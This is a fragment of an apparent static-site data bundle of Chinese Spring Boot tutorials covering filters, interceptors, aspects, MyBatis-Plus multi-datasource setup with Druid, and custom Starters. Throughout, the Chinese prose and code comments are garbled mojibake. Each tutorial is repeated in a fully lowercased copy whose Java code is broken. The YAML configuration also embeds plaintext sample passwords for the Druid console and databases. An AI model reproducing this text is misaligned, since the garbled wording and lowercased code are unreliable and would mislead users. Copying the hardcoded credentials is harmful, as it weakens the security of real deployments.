org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n\n@Configuration\npublic class InterceptorConfig implements WebMvcConfigurer{\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        //è¨»åTestInterceptoræ¦æªå¨ new æè æ³¨å¥ é½è¡\n        InterceptorRegistration registration = registry.addInterceptor(new MyInterceptor());\n        //ææè·¯å¾é½è¢«æ¦æª\n        registration.addPathPatterns("/**");\n        //æ·»å ä¸æ¦æªè·¯å¾\n        registration.excludePathPatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# Aspect åé¢\n\nAspect å¯ä»¥èªå®ä¹è¦åå¥çç±»çè³åç»çæ¹æ³ï¼ç²åº¦æå°ã\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.Component;\n\n@Aspect\n@Component\n@Slf4j\npublic class MyAspect {\n\n//    @Before("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void Before(JoinPoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @After("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void After(JoinPoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @AfterThrowing("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void AfterThrowing(JoinPoint point){\n//        log.info("æ§è¡å¼å¸¸");\n//    }\n\n    @Around("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n    public Object Around(ProceedingJoinPoint point) throws Throwable {\n        log.info("MyAspect ç¯ç»æ§è¡");\n        log.info("MyAspect åæ° ",point.getArgs());\n        Object obj = point.proceed();\n        log.info("MyAspect æ§è¡å®æç»æ ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',normalizedContent:'springboot æä¾äºéä¸­æ¦æªæºå¶ï¼å¯ä»¥æ¹ä¾¿æä»¬å¨ä¸å¡å±è¿è¡æ©å±ï¼çæçæ filterãinterceptorãaspectãå controlleradvice ä»ç¨äºå¤ç controller å¼å¸¸äºæ¯è¾å¤çï¼æä»¥åæ¬¡ä¸è¿å¤ä»ç»ãä¸å¾ä»ç»äºæºå¶æå¨å±æ¬¡ï¼\n\n\n\n\n# filter è¿æ»¤å¨\n\nå®ç°æ¹å¼æä¸¤ç§ï¼è¿æ»¤å¨æ æ³è·å¾ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼å¹¶å¯¹ææè¯·æ±èµ·ä½ç¨\n\n\n# ç¬¬ä¸ç§\n\nå®ç° filter æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\nimport javax.servlet.*;\nimport java.io.ioexception;\n\n@component\n@slf4j\npublic class myfilter implements filter {\n    @override\n    public void init(filterconfig filterconfig) throws servletexception {\n        log.info("åå§å");\n    }\n\n    @override\n    public void dofilter(servletrequest servletrequest, servletresponse servletresponse, filterchain filterchain) throws ioexception, servletexception {\n        log.info("æ§è¡");\n        filterchain.dofilter(servletrequest,servletresponse);\n    }\n\n    @override\n    public void destroy() {\n        log.info("éæ¯");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# ç¬¬äºç§\n\néç½®å° bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myfilter;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.arrays;\n\n@configuration\npublic class filterconfig {\n\n    @bean\n    public filterregistrationbean myfilter(){\n        filterregistrationbean filterregistrationbean = new filterregistrationbean();\n        filterregistrationbean.setfilter(new myfilter());\n        filterregistrationbean.seturlpatterns(arrays.aslist("/*"));\n        return filterregistrationbean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# interceptor æ¦æªå¨\n\næ¦æªå¨å¯ä»¥è·å ioc å®¹å¨ä¸­çåä¸ª bean, æ¦æªå¨æ¯åºäº java çåå°æºå¶çï¼æ¦æªå¨åªè½å¯¹ action è¯·æ±èµ·ä½ç¨ï¼æ¦æªå¨å¯ä»¥è®¿é® action ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼ä½æ æ³è·ååæ°ã\n\n\n# ä¸ãå®ç° handlerinterceptor æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\nimport org.springframework.web.servlet.handlerinterceptor;\nimport org.springframework.web.servlet.modelandview;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\n\n@slf4j\n@component\npublic class myinterceptor implements handlerinterceptor{\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³å\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public boolean prehandle(httpservletrequest request, httpservletresponse response, object handler) throws exception {\n        log.info("æ§è¡æ¹æ³å");\n        return false;\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void posthandle(httpservletrequest request, httpservletresponse response, object handler, modelandview modelandview) throws exception {\n        log.info("æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡");\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡å®ä¸å®ä¼æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void aftercompletion(httpservletrequest request, httpservletresponse response, object handler, exception ex) throws exception {\n        log.info("æ§è¡å®ä¸å®ä¼æ§è¡");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# äºãæ³¨åå° interceptorregistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myinterceptor;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistry;\nimport org.springframework.web.servlet.config.annotation.webmvcconfigurer;\n\n\n@configuration\npublic class interceptorconfig implements webmvcconfigurer{\n\n    @override\n    public void addinterceptors(interceptorregistry registry) {\n        //è¨»åtestinterceptoræ¦æªå¨ new æè æ³¨å¥ é½è¡\n        interceptorregistration registration = registry.addinterceptor(new myinterceptor());\n        //ææè·¯å¾é½è¢«æ¦æª\n        registration.addpathpatterns("/**");\n        //æ·»å ä¸æ¦æªè·¯å¾\n        registration.excludepathpatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# aspect åé¢\n\naspect å¯ä»¥èªå®ä¹è¦åå¥çç±»çè³åç»çæ¹æ³ï¼ç²åº¦æå°ã\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.aspectj.lang.joinpoint;\nimport org.aspectj.lang.proceedingjoinpoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.component;\n\n@aspect\n@component\n@slf4j\npublic class myaspect {\n\n//    @before("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void before(joinpoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @after("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void after(joinpoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @afterthrowing("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void afterthrowing(joinpoint point){\n//        log.info("æ§è¡å¼å¸¸");\n//    }\n\n    @around("execution(* com.wt.cloud.web.helloweb.*(..))")\n    public object around(proceedingjoinpoint point) throws throwable {\n        log.info("myaspect ç¯ç»æ§è¡");\n        log.info("myaspect åæ° ",point.getargs());\n        object obj = point.proceed();\n        log.info("myaspect æ§è¡å®æç»æ ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',charsets:{cjk:!0}},{title:"SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº",frontmatter:{title:"SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/203.SpringBoot%20MyBatisPlus%20%E5%AE%9E%E7%8E%B0%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/203.SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº.md",key:"v-02fdbe47",path:"/spring/spring-boot/203/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'å¨ spring boot æ´åä¸­è¿æ¯ä¼åºç°é®é¢ãå¦ä¸ï¼\n\nDescription:\n\nFailed to configure a DataSource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\nåªéè¦å¨ éç½®æä»¶ä¸­å å¦ä¸ï¼\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n\n\n1\n2\n3\n\n\nç¨çæ¯ Druid çæ°æ®æºï¼æä»¥æé¤ Druid ä½¿ç¨ spring boot èªå¸¦çã\n\nä¾èµ\n\n\x3c!-- æ°æ®æä¹ç¸å³éç½® --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- é©±å¨ --\x3e\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid-spring-boot-starter</artifactId>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- å¤æ°æ®æº --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\néç½®æä»¶\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n  datasource:\n    # éç½®çæ§\n    druid:\n      stat-view-servlet:\n        # å¨1.1.9çæ¬ä¸éè¦ï¼ä»¥ä¸å¿é¡»è¦\n        enabled: true\n        url-pattern: "/druid/*"\n        # IPç½åå(æ²¡æéç½®æèä¸ºç©ºï¼ååè®¸ææè®¿é®)\n        allow: 127.0.0.1\n        # IPé»åå (å­å¨å±åæ¶ï¼denyä¼åäºallow)\n        deny: 192.168.1.73\n        # ç¦ç¨HTMLé¡µé¢ä¸çâReset Allâåè½\n        reset-enable: true\n        # ç»å½å\n        login-username: admin\n        # ç»å½å¯ç \n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # éç½®çæ§ç»è®¡æ¦æªçfilters,å»æåï¼çæ§çé¢çsqlæ æ³ç»è®¡\n        # filter æä¾çæælog æ¯ä¸ºäº è¾åºJDBCæ§è¡çæ¥å¿\n        filters: stat,wall\n        # åå§åè¿æ¥å¤§å°\n        initial-size: 30\n        # æå°ç©ºé²è¿æ¥æ°\n        min-idle: 20\n        # æå¤§è¿æ¥æ°\n        maxActive: 200\n        # è·åè¿æ¥æ¶æå¤§ç­å¾æ¶é´ï¼åä½æ¯«ç§ï¼ä½¿ç¨\n        maxWait: 10000\n        # maxWait å¹¶åæçä¼ææä¸éï¼maxWait ä¼é æå¬å¹³éï¼useUnfairLock ä½¿ç¨éå¬å¹³é\n        useUnfairLock: true\n        # æ£æµè¿æ¥æ¯å¦å¯ç¨çæµè¯è¯­å¥ å¦æä¸º nullï¼testOnBorrow testOnReturn testWhileIdle é½ä¸èµ·ä½ç¨\n        validation-query: \'select 1\'\n        # testWhileIdle(ç©ºé²æ¶æ£æµ)ï¼å¦æä¸ºtrueï¼é»è®¤trueï¼ï¼å½åºç¨åè¿æ¥æ± ç³è¯·è¿æ¥ï¼å¹¶ä¸testOnBorrowä¸ºfalseæ¶ï¼è¿æ¥æ± å°ä¼å¤æ­è¿æ¥æ¯å¦å¤äºç©ºé²ç¶æï¼å¦ææ¯ï¼åéªè¯è¿æ¡è¿æ¥æ¯å¦å¯ç¨ã\n        # testWhileIdleä»ä¹æ¶åä¼èµ·ä½ç¨? è·åè¿æ¥æ¶ ä¸ testOnBorrow=false testWhileIdle=true\n        testWhileIdle: true\n        # testOnBorrow(è·åè¿æ¥æ¶æ£æµ) æ£æµæ± éè¿æ¥çå¯ç¨æ§ false ä¸æ£æµ true æ£æµ.ä½æ¶èæ§è½ã\n        # åå¦è¿æ¥æ± ä¸­çè¿æ¥è¢«æ°æ®åºå³é­äºï¼åºç¨éè¿è¿æ¥æ± getConnectionæ¶ï¼å¯è½è·åå°è¿äºä¸å¯ç¨çè¿æ¥ï¼ä¸è¿äºè¿æ¥å¦æä¸è¢«å¶ä»çº¿ç¨åæ¶çè¯ï¼å®ä»¬ä¸ä¼è¢«è¿æ¥æ± è¢«åºé¤ï¼ä¹ä¸ä¼éæ°è¢«åå»ºï¼\n        # å ç¨äºè¿æ¥æ± çåé¢ï¼é¡¹ç®æ¬èº«ä½ä¸ºæå¡ç«¯ï¼æ°æ®åºé¾æ¥è¢«å³é­ï¼å®¢æ·ç«¯è°ç¨æå¡ç«¯å°±ä¼åºç°å¤§éçtimeoutï¼å®¢æ·ç«¯è®¾ç½®äºè¶æ¶æ¶é´ï¼ç¶èä¸»å¨æ­å¼ï¼æå¡ç«¯å¿ç¶åºç°close_waitã\n        testOnBorrow: false\n        # è¿æ¥ä¿æç©ºé²èä¸è¢«é©±éçæå°æ¶é´,å¦æè¯´è¿æ¥ççæ­£ç©ºé²æ¶é´ ç­äºè¯¥å¼ï¼åå³é­ç©çè¿æ¥\n        # minEvictableIdleTimeMillis: 30000\n        testOnReturn: false\n      primary: wiedp\n      datasource:\n        # ä¸»åº\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # ééåº\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nå®æ¹å®æ´æ¡ä¾',normalizedContent:'å¨ spring boot æ´åä¸­è¿æ¯ä¼åºç°é®é¢ãå¦ä¸ï¼\n\ndescription:\n\nfailed to configure a datasource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\nåªéè¦å¨ éç½®æä»¶ä¸­å å¦ä¸ï¼\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n\n\n1\n2\n3\n\n\nç¨çæ¯ druid çæ°æ®æºï¼æä»¥æé¤ druid ä½¿ç¨ spring boot èªå¸¦çã\n\nä¾èµ\n\n\x3c!-- æ°æ®æä¹ç¸å³éç½® --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>mybatis-plus-boot-starter</artifactid>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- é©±å¨ --\x3e\n<dependency>\n    <groupid>mysql</groupid>\n    <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n<dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>druid-spring-boot-starter</artifactid>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- å¤æ°æ®æº --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>dynamic-datasource-spring-boot-starter</artifactid>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\néç½®æä»¶\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n  datasource:\n    # éç½®çæ§\n    druid:\n      stat-view-servlet:\n        # å¨1.1.9çæ¬ä¸éè¦ï¼ä»¥ä¸å¿é¡»è¦\n        enabled: true\n        url-pattern: "/druid/*"\n        # ipç½åå(æ²¡æéç½®æèä¸ºç©ºï¼ååè®¸ææè®¿é®)\n        allow: 127.0.0.1\n        # ipé»åå (å­å¨å±åæ¶ï¼denyä¼åäºallow)\n        deny: 192.168.1.73\n        # ç¦ç¨htmlé¡µé¢ä¸çâreset allâåè½\n        reset-enable: true\n        # ç»å½å\n        login-username: admin\n        # ç»å½å¯ç \n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # éç½®çæ§ç»è®¡æ¦æªçfilters,å»æåï¼çæ§çé¢çsqlæ æ³ç»è®¡\n        # filter æä¾çæælog æ¯ä¸ºäº è¾åºjdbcæ§è¡çæ¥å¿\n        filters: stat,wall\n        # åå§åè¿æ¥å¤§å°\n        initial-size: 30\n        # æå°ç©ºé²è¿æ¥æ°\n        min-idle: 20\n        # æå¤§è¿æ¥æ°\n        maxactive: 200\n        # è·åè¿æ¥æ¶æå¤§ç­å¾æ¶é´ï¼åä½æ¯«ç§ï¼ä½¿ç¨\n        maxwait: 10000\n        # maxwait å¹¶åæçä¼ææä¸éï¼maxwait ä¼é æå¬å¹³éï¼useunfairlock ä½¿ç¨éå¬å¹³é\n        useunfairlock: true\n        # æ£æµè¿æ¥æ¯å¦å¯ç¨çæµè¯è¯­å¥ å¦æä¸º nullï¼testonborrow testonreturn testwhileidle é½ä¸èµ·ä½ç¨\n        validation-query: \'select 1\'\n        # testwhileidle(ç©ºé²æ¶æ£æµ)ï¼å¦æä¸ºtrueï¼é»è®¤trueï¼ï¼å½åºç¨åè¿æ¥æ± ç³è¯·è¿æ¥ï¼å¹¶ä¸testonborrowä¸ºfalseæ¶ï¼è¿æ¥æ± å°ä¼å¤æ­è¿æ¥æ¯å¦å¤äºç©ºé²ç¶æï¼å¦ææ¯ï¼åéªè¯è¿æ¡è¿æ¥æ¯å¦å¯ç¨ã\n        # testwhileidleä»ä¹æ¶åä¼èµ·ä½ç¨? è·åè¿æ¥æ¶ ä¸ testonborrow=false testwhileidle=true\n        testwhileidle: true\n        # testonborrow(è·åè¿æ¥æ¶æ£æµ) æ£æµæ± éè¿æ¥çå¯ç¨æ§ false ä¸æ£æµ true æ£æµ.ä½æ¶èæ§è½ã\n        # åå¦è¿æ¥æ± ä¸­çè¿æ¥è¢«æ°æ®åºå³é­äºï¼åºç¨éè¿è¿æ¥æ± getconnectionæ¶ï¼å¯è½è·åå°è¿äºä¸å¯ç¨çè¿æ¥ï¼ä¸è¿äºè¿æ¥å¦æä¸è¢«å¶ä»çº¿ç¨åæ¶çè¯ï¼å®ä»¬ä¸ä¼è¢«è¿æ¥æ± è¢«åºé¤ï¼ä¹ä¸ä¼éæ°è¢«åå»ºï¼\n        # å ç¨äºè¿æ¥æ± çåé¢ï¼é¡¹ç®æ¬èº«ä½ä¸ºæå¡ç«¯ï¼æ°æ®åºé¾æ¥è¢«å³é­ï¼å®¢æ·ç«¯è°ç¨æå¡ç«¯å°±ä¼åºç°å¤§éçtimeoutï¼å®¢æ·ç«¯è®¾ç½®äºè¶æ¶æ¶é´ï¼ç¶èä¸»å¨æ­å¼ï¼æå¡ç«¯å¿ç¶åºç°close_waitã\n        testonborrow: false\n        # è¿æ¥ä¿æç©ºé²èä¸è¢«é©±éçæå°æ¶é´,å¦æè¯´è¿æ¥ççæ­£ç©ºé²æ¶é´ ç­äºè¯¥å¼ï¼åå³é­ç©çè¿æ¥\n        # minevictableidletimemillis: 30000\n        testonreturn: false\n      primary: wiedp\n      datasource:\n        # ä¸»åº\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # ééåº\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nå®æ¹å®æ´æ¡ä¾',charsets:{cjk:!0}},{title:"SpringBoot ä¹ Starter",frontmatter:{title:"SpringBoot ä¹ Starter",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/201.SpringBoot%20%E4%B9%8B%20Starter.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/201.SpringBoot ä¹ Starter.md",key:"v-23c6095a",path:"/spring/spring-boot/201/",headers:[{level:2,title:"ä¸ãstarterä¾èµ",slug:"ä¸ãstarterä¾èµ",normalizedTitle:"ä¸ãstarter ä¾èµ",charIndex:311},{level:2,title:"äºãæ·»å éç½®ç±»",slug:"äºãæ·»å éç½®ç±»",normalizedTitle:"äºãæ·»å éç½®ç±»",charIndex:718},{level:2,title:"æ·»å å è½½ç±»",slug:"æ·»å å è½½ç±»",normalizedTitle:"æ·»å å è½½ç±»",charIndex:1894},{level:2,title:"åãæå®å è½½æä»¶è·¯å¾",slug:"åãæå®å è½½æä»¶è·¯å¾",normalizedTitle:"åãæå®å è½½æä»¶è·¯å¾",charIndex:5706},{level:2,title:"äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£",slug:"äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£",normalizedTitle:"äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£",charIndex:6516},{level:2,title:"å­ãåçº§å° SpringBoot3 ä½¿ç¨ starter",slug:"å­ãåçº§å°-springboot3-ä½¿ç¨-starter",normalizedTitle:"å­ãåçº§å° springboot3 ä½¿ç¨ starter",charIndex:7103}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¸ãstarterä¾èµ äºãæ·»å éç½®ç±» æ·»å å è½½ç±» åãæå®å è½½æä»¶è·¯å¾ äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£ å­ãåçº§å° SpringBoot3 ä½¿ç¨ starter",content:'Spring Boot Starter æ¯ä¸ç»å¯éç¨çä¾èµåºï¼å®ä»¬æä¾äºä¸ç§å¿«éå¯å¨ Spring Boot åºç¨ç¨åºçæ¹å¼ãæ¯ä¸ª Starter é½åå«äºä¸ç»é¢éç½®çä¾èµé¡¹åèªå¨éç½®ç±»ï¼ä½¿å¾ä½¿ç¨èå¯ä»¥è½»æ¾å°éæåç§ä¸åçåè½æ¨¡åï¼èæ éæå¨éç½®å¤§éçä¾èµé¡¹ååæ°ãè¿æ ·ï¼å¼åäººåå¯ä»¥æ´å ä¸æ³¨äºä¸å¡é»è¾çå®ç°ï¼èä¸éè¦å³å¿åºå±çéç½®åéæç»èã\n\nSpring Boot Starter çæä¹å¨äºåå°äºåºç¨ç¨åºçå¼åææ¬åå¤æåº¦ï¼æé«äºå¼åæçåä»£ç è´¨éï¼å¹¶ä¸æ¯ææ´å¿«çè¿­ä»£åé¨ç½²ãå¦å¤ï¼ç¤¾åºä¹æä¾äºå¾å¤å¸¸ç¨ç Starterï¼å¦æ°æ®åºãWeb æ¡æ¶ãå®å¨æ¡æ¶ç­ï¼å¯ä»¥ç´æ¥ä½¿ç¨ï¼ä¹å¯ä»¥éè¿å®å¶æ¥æ»¡è¶³å·ä½çéæ±ã\n\n\n# ä¸ãstarter ä¾èµ\n\næ°å»ºä¸ä¸ª spring boot å·¥ç¨ã\n\n\x3c!-- åå«äºlog ä»¥å autoconfigure ç­ --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter</artifactId>\n</dependency>\n\n\x3c!-- å¯¹ @ConfigurationProperties çå¤ç --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# äºãæ·»å éç½®ç±»\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.Data;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\n\n/**\n * @Author big uncle\n * @Date 2019/11/27 9:27\n **/\n@ConfigurationProperties(prefix = "security.authentication")\n@Data\npublic class AuthenticationProperties {\n\n    /**\n     * token\n    **/\n    private String userToken = "USER:TOKEN:";\n    /**\n     * æ¦æª\n    **/\n    private String authorization = "Authorization";\n    /**\n     * é»è®¤åæ°ç¨æ·\n     **/\n    private String userKey = "default:user:";\n    /**\n     * æé\n    **/\n    private String authorityKey = "USER:AUTHORITY:";\n    /**\n     * ç¨æ·è®¿é®èµæºé é»è®¤ä¸æ¦æª\n    **/\n    private Boolean authorityLock = false;\n    /**\n     * é¡¹ç®è¿æ»¤éå, ä»¥éå·åå²\n    **/\n    private List<String> projectUrl;\n    /**\n     * ç¹æ®è·¯å¾æ¾å¼æ¦æªï¼èµ°é RequestData æ¹å¼\n     **/\n    private List<String> specialUrl;\n    /**\n     * å¤±è´¥å¤çå¨\n    **/\n    private String failureUrl = "/failure/authenticationFilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# æ·»å å è½½ç±»\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @Author big uncle\n * @Date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.AuthenticationCep;\nimport com.xianwt.cloud.cep.AuthorizationCep;\nimport com.xianwt.cloud.cep.ProjectUrlFilterCep;\nimport com.xianwt.cloud.cep.SpecialFilterCep;\nimport com.xianwt.cloud.cep.impl.AuthenticationCepImpl;\nimport com.xianwt.cloud.cep.impl.AuthorizationCepImpl;\nimport com.xianwt.cloud.cep.impl.ProjectUrlFilterCepImpl;\nimport 